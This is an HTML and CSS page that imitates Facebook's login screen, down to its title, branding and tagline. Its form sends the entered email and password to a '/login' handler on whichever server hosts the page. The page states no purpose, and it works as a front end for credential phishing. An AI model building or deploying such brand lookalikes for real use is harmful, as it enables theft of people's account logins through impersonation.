<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook – log in or sign up</title>
    <style>
        body {
            font-family: Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            display: flex;
            width: 980px;
            justify-content: space-between;
            align-items: center;
        }

        .left-content {
            width: 500px;
            padding-bottom: 100px;
        }

        .left-content h1 {
            color: #1877f2;
            font-size: 60px;
            margin-bottom: 0;
        }

        .left-content p {
            font-size: 28px;
            line-height: 32px;
            margin-top: 10px;
        }

        .login-box {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            width: 396px;
            text-align: center;
        }

        input {
            width: 100%;
            padding: 14px 16px;
            margin: 6px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            box-sizing: border-box;
            font-size: 17px;
        }

        .login-btn {
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            padding: 10px;
            width: 100%;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }

        .forgot-pw {
            color: #1877f2;
            font-size: 14px;
            text-decoration: none;
            display: block;
            margin: 15px 0;
        }

        hr {
            border: 0;
            border-top: 1px solid #dadde1;
            margin: 20px 0;
        }

        .create-btn {
            background-color: #42b72a;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            padding: 12px 16px;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="left-content">
            <h1>facebook</h1>
            <p>Connect with friends and the world around you on Facebook.</p>
        </div>
        <div class="login-box">
            <form action="/login" method="post">
                <input type="text" name="email" placeholder="Email or phone number" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" class="login-btn">Log In</button>
                <a href="#" class="forgot-pw">Forgot password?</a>
                <hr>
                <button type="button" class="create-btn">Create new account</button>
            </form>
        </div>
    </div>
</body>

</html>
